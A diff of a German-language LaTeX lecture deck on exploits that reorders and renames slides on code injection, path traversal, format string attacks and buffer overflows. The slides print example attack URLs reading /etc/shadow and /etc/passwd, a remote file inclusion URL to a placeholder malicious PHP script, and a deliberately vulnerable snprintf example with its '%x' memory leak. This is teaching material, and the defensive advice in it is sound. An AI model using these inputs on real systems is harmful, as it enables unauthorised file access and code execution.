@@ -267,8 +267,15 @@
 %	EXPLOITS
 %----------------------------------------------------------------------------------------
 
+%----------------------------------------------------------------------------------------
+% Code Injection
+%----------------------------------------------------------------------------------------
+
 \section{Exploits}
-\begin{frame}[fragile]{Code Injection}
+
+\subsection{Code Injections}
+
+\begin{frame}[fragile]{Code Injections}
   Code Injection ist das ausnutzen von Bugs durch Eingabe von ungewollten Parametern, um dadurch die Ausf\"urung zu ver\"andern.
   \newline
   Kann folgende Auswirkungen haben:
@@ -292,7 +299,7 @@
 %	SQL INJECTION
 %----------------------------------------------------------------------------------------
 
-\subsection{SQL Injection}
+\subsubsection{SQL Injection}
 
 \begin{frame}[fragile]{SQL Injection}
   Ausnutzen von Sicherheitsl\"ucken in Zusammenhang mit SQL-Datenbanken.
@@ -356,7 +363,7 @@
 %	CROSS SITE SCRIPTING
 %----------------------------------------------------------------------------------------
 
-\subsection{Cross Site Scripting}
+\subsubsection{Cross Site Scripting}
 
 \begin{frame}[fragile]{Cross Site Scripting - XSS}
   Bei Cross-Site Scripting (XSS) werden Sicherheitsl\"ucken in Webanwendungen ausgenutzt um schadhaften Code in sonst vertrauensw\"urdigen Websiten einzubinden.
@@ -474,141 +481,6 @@
 \end{frame}
 
 %----------------------------------------------------------------------------------------
-%	PATH TRAVERSAL ATTACK
-%----------------------------------------------------------------------------------------
-
-\subsection{Path Traversal Attack}
-
-\begin{frame}[fragile]{Path Traversal Attack}
-  Ein HTTP Angriff, bei dem ein Angreifer Zugriff auf gesperrte Verzeichnisse gewinnt und Code ausserhalb des Web Root Verzeichnisses ausf\"uhrt.
-  \newline
-  \newline
-  Web Container Encoding:
-  \begin{lstlisting}[style=BashStyle]
-  ..%c0%af represents ../
-  ..%c1%9c represents ..\
-  \end{lstlisting}
-
-  Null bytes \%00 k\"onnen injeziert werden um Dateinahmen zu terminieren.
-  \begin{lstlisting}[style=BashStyle]
-  ?file=secret.doc%00.pdf
-  \end{lstlisting}
-  Java sieht .pdf, Betriebssystem sieht .doc
-\end{frame}
-
-\begin{frame}[fragile]{Path Traversal Attack - Beispiele}
-  Beispiel Zugriff auf Dateien:
-  \begin{lstlisting}[style=BashStyle]
-  http://some_site.com.br/get-files.jsp?file=report.pdf
-  http://some_site.com.br/some-page.asp?page=index.html
-  \end{lstlisting}
-
-  UNIX Passwort abgreifen:
-  \begin{lstlisting}[style=BashStyle]
-  http://some_site.com.br/../../../../etc/shadow
-  http://some_site.com.br/get-files?file=/etc/passwd
-  \end{lstlisting}
-
-  Auch m\"oglich Dateien und Scripte von externen Websiten einzibinden:
-  \begin{lstlisting}[style=BashStyle]
-  http://some_site.com.br/some-page?page=http:
-    //other-site.com.br/other-page.htm/malicius-code.php
-  \end{lstlisting}
-\end{frame}
-
-\begin{frame}[fragile]{Path Traversal Attack - Schutzma{\ss}nahmen}
-  \begin{itemize}
-    \item Nutzereingaben vermeiden wenn m\"oglich, bei Datei System Aufrufen
-    \item Indexes anstatt Dateinahmen verwenden, f\"ur Benutzereingaben
-    \item Nutzer soll nicht ganzen Pfad eingeben k\"onnen, mit eigenem Pfad umgeben
-    \item Pfade normalisieren
-    \begin{itemize}
-      \item "." Segmente entfernen
-      \item ".." - Segmente die ein nicht-".." Segment dafor haben werden entfernt
-      \item Wenn Pfad relative und das erste Segment enth\"alt ein ":" Charackter dann wir ein "." vorangestellt
-    \end{itemize}
-  \end{itemize}
-\end{frame}
-
-%----------------------------------------------------------------------------------------
-%	FORMAT STRING ATTACK
-%----------------------------------------------------------------------------------------
-
-\subsection{Format String Attack}
-
-\begin{frame}[fragile]{Format String Attack}
-  Format Funktion ist eine ANSI C Funktion, um primitive Variablen in eine lesbare Ausgabe konvertieren. z.B. \textit{printf}, \textit{fprintf}
-  \begin{itemize}
-    \item Sind C/C++ Probleme
-    \item treten heute nicht sehr h\"afig auf, da sie sich sehr leicht erkennen lassen
-  \end{itemize}
-
-  Ziele:
-  \begin{itemize}
-    \item Programmcrash
-    \item Schadcode ausf\"uhrung
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[fragile]{Format String Attack - Beispiel I}
-  \begin{lstlisting}[style=CStyle]
-  int main (int argc, char **argv)
-  {
-	   char buf [100];
-	   int x = 1 ;
-
-	   snprintf ( buf, sizeof buf, argv [1] ) ;
-	   buf [ sizeof buf -1 ] = 0;
-
-	   printf ( “Buffer size is: (%d)
-          \nData input: %s \n” , strlen (buf) , buf ) ;
-
-	   printf ( “X equals: %d/ in
-          hex: %#x\nMemory address
-          for x: (%p) \n” , x, x, &x) ;
-
-	   return 0 ;
-  }
-  \end{lstlisting}
-\end{frame}
-
-\begin{frame}[fragile]{Format String Attack - Beispiel II}
-  Erwartete Eingabe:
-  \begin{lstlisting}[style=BashStyle]
-  ./formattest “Bob”
-  \end{lstlisting}
-
-  Ausgabe:
-  \begin{lstlisting}[style=BashStyle]
-  Buffer size is (3)
-  Data input : Bob
-  X equals: 1/ in hex: 0x1
-  Memory address for x (0xbffff73c)
-  \end{lstlisting}
-\end{frame}
-
-\begin{frame}[fragile]{Format String Attack - Beispiel III}
-  Schwachstelle ausgenutzt, \%x := Ausgabe Hexadezimal:
-  \begin{lstlisting}[style=BashStyle]
-  ./formattest “Bob %x %x”
-  \end{lstlisting}
-
-  Anstatt \%x Wert von Bob auszugeben, gibt nun auch den Inhalt der Speicher Adresse aus:
-  \begin{lstlisting}[style=BashStyle]
-  Buffer size is (14)
-  Data input : Bob bffff 8740
-  X equals: 1/ in hex: 0x1
-  Memory address for x (0xbffff73c)
-  \end{lstlisting}
-
-  \textit{printf} Argument sieht nun folgenderma{\ss}en aus:
-  \begin{lstlisting}[style=CStyle]
-  printf ( “Buffer size is: (%d) \n Data input:
-      Bob %x %x \n” , strlen (buf) , buf ) ;
-  \end{lstlisting}
-\end{frame}
-
-%----------------------------------------------------------------------------------------
 %	OVERFLOWS
 %----------------------------------------------------------------------------------------
 
@@ -692,9 +564,7 @@
   \end{figure}
 \end{frame}
 
-\subsubsection{Stack Overflows}
-
-\begin{frame}[fragile]{Stack Overflows}
+\begin{frame}[fragile]{Buffer Overflows}
  Die R\"ucksprungadresse eines Unterprogramms und dessen lokale Variablen werden auf einen als Stack bezeichneten Bereich zu gelegt.
  \begin{lstlisting}[style=CStyle]
   void input_line()
@@ -713,7 +583,7 @@
  \end{figure}
 \end{frame}
 
-\begin{frame}[fragile]{Stack Overflow - Beispiel}
+\begin{frame}[fragile]{Buffer Overflow - Beispiel}
   Wir betrachten folgende Programm:
   \begin{lstlisting}[style=C2Style]
     #include <stdio.h>
@@ -739,7 +609,7 @@
   Unsere Ziel ist die Funktion secretFunction() aufrufen onhe direkten Befehl dazu
 \end{frame}
 
-\begin{frame}[fragile]{Stack Overflow - Beispiel}
+\begin{frame}[fragile]{Buffer Overflow - Beispiel}
   Mit Hilfe des Programs objdump, schauen wir den Assemble-code von unserem Program.
 
   \begin{lstlisting}[style=C2Style]
@@ -749,7 +619,7 @@
   \includegraphics[width=\textwidth]{buffer-1.png}
 \end{frame}
 
-\begin{frame}[fragile]{Stack Overflow - Beispiel}
+\begin{frame}[fragile]{Buffer Overflow - Beispiel}
   Was k\"onen wir aus dem Assemblercode bestimmen:
 
   \begin{itemize}
@@ -765,7 +635,7 @@
 
 \end{frame}
 
-\begin{frame}[fragile]{Stack Overflow - Beispiel}
+\begin{frame}[fragile]{Buffer Overflow - Beispiel}
   Jetzt wissen wir, dass 32 Bytes f\"ur den Puffer reserviert sind, es ist direkt neben \%ebp. Daher speichern wir die n\"achsten 4 Bytes den \%ebp und die n\"achsten 4 Bytes speichern die R\"uckkehradresse (die Adresse, zu der \%eip nach Abschluss der Funktion springen wird). Die ersten 28 + 4 = 32 Bytes w\"aren beliebige zuf\"allige Zeichen und die n\"achsten 4 Bytes sind die Adresse der secretFunction.
 
   \begin{itemize}
@@ -811,6 +681,142 @@
     \item in Java BigInt verwenden
   \end{itemize}
   \includegraphics[scale=0.25]{integer_overflow}
+\end{frame}
+
+
+%----------------------------------------------------------------------------------------
+% PATH TRAVERSAL ATTACK
+%----------------------------------------------------------------------------------------
+
+\subsection{Path Traversal Attack}
+
+\begin{frame}[fragile]{Path Traversal Attack}
+  Ein HTTP Angriff, bei dem ein Angreifer Zugriff auf gesperrte Verzeichnisse gewinnt und Code ausserhalb des Web Root Verzeichnisses ausf\"uhrt.
+  \newline
+  \newline
+  Web Container Encoding:
+  \begin{lstlisting}[style=BashStyle]
+  ..%c0%af represents ../
+  ..%c1%9c represents ..\
+  \end{lstlisting}
+
+  Null bytes \%00 k\"onnen injeziert werden um Dateinahmen zu terminieren.
+  \begin{lstlisting}[style=BashStyle]
+  ?file=secret.doc%00.pdf
+  \end{lstlisting}
+  Java sieht .pdf, Betriebssystem sieht .doc
+\end{frame}
+
+\begin{frame}[fragile]{Path Traversal Attack - Beispiele}
+  Beispiel Zugriff auf Dateien:
+  \begin{lstlisting}[style=BashStyle]
+  http://some_site.com.br/get-files.jsp?file=report.pdf
+  http://some_site.com.br/some-page.asp?page=index.html
+  \end{lstlisting}
+
+  UNIX Passwort abgreifen:
+  \begin{lstlisting}[style=BashStyle]
+  http://some_site.com.br/../../../../etc/shadow
+  http://some_site.com.br/get-files?file=/etc/passwd
+  \end{lstlisting}
+
+  Auch m\"oglich Dateien und Scripte von externen Websiten einzubinden:
+  \begin{lstlisting}[style=BashStyle]
+  http://some_site.com.br/some-page?page=http:
+    //other-site.com.br/other-page.htm/malicius-code.php
+  \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Path Traversal Attack - Schutzma{\ss}nahmen}
+  \begin{itemize}
+    \item Nutzereingaben vermeiden wenn m\"oglich, bei Datei System Aufrufen
+    \item Indexes anstatt Dateinahmen verwenden, f\"ur Benutzereingaben
+    \item Nutzer soll nicht ganzen Pfad eingeben k\"onnen, mit eigenem Pfad umgeben
+    \item Pfade normalisieren
+    \begin{itemize}
+      \item "." Segmente entfernen
+      \item ".." - Segmente die ein nicht-".." Segment dafor haben werden entfernt
+      \item Wenn Pfad relative und das erste Segment enth\"alt ein ":" Charackter dann wir ein "." vorangestellt
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+%----------------------------------------------------------------------------------------
+% FORMAT STRING ATTACK
+%----------------------------------------------------------------------------------------
+
+\subsection{Format String Attack}
+
+\begin{frame}[fragile]{Format String Attack}
+  Format Funktion ist eine ANSI C Funktion, um primitive Variablen in eine lesbare Ausgabe konvertieren. z.B. \textit{printf}, \textit{fprintf}
+  \begin{itemize}
+    \item Sind C/C++ Probleme
+    \item treten heute nicht sehr h\"afig auf, da sie sich sehr leicht erkennen lassen
+  \end{itemize}
+
+  Ziele:
+  \begin{itemize}
+    \item Programmcrash
+    \item Schadcode ausf\"uhrung
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Format String Attack - Beispiel I}
+  \begin{lstlisting}[style=CStyle]
+  int main (int argc, char **argv)
+  {
+     char buf [100];
+     int x = 1 ;
+
+     snprintf ( buf, sizeof buf, argv [1] ) ;
+     buf [ sizeof buf -1 ] = 0;
+
+     printf ( “Buffer size is: (%d)
+          \nData input: %s \n” , strlen (buf) , buf ) ;
+
+     printf ( “X equals: %d/ in
+          hex: %#x\nMemory address
+          for x: (%p) \n” , x, x, &x) ;
+
+     return 0 ;
+  }
+  \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Format String Attack - Beispiel II}
+  Erwartete Eingabe:
+  \begin{lstlisting}[style=BashStyle]
+  ./formattest “Bob”
+  \end{lstlisting}
+
+  Ausgabe:
+  \begin{lstlisting}[style=BashStyle]
+  Buffer size is (3)
+  Data input : Bob
+  X equals: 1/ in hex: 0x1
+  Memory address for x (0xbffff73c)
+  \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Format String Attack - Beispiel III}
+  Schwachstelle ausgenutzt, \%x := Ausgabe Hexadezimal:
+  \begin{lstlisting}[style=BashStyle]
+  ./formattest “Bob %x %x”
+  \end{lstlisting}
+
+  Anstatt \%x Wert von Bob auszugeben, gibt nun auch den Inhalt der Speicher Adresse aus:
+  \begin{lstlisting}[style=BashStyle]
+  Buffer size is (14)
+  Data input : Bob bffff 8740
+  X equals: 1/ in hex: 0x1
+  Memory address for x (0xbffff73c)
+  \end{lstlisting}
+
+  \textit{printf} Argument sieht nun folgenderma{\ss}en aus:
+  \begin{lstlisting}[style=CStyle]
+  printf ( “Buffer size is: (%d) \n Data input:
+      Bob %x %x \n” , strlen (buf) , buf ) ;
+  \end{lstlisting}
 \end{frame}
 
 % \begin{frame}[fragile]{Buffer Overflows -Programm I}
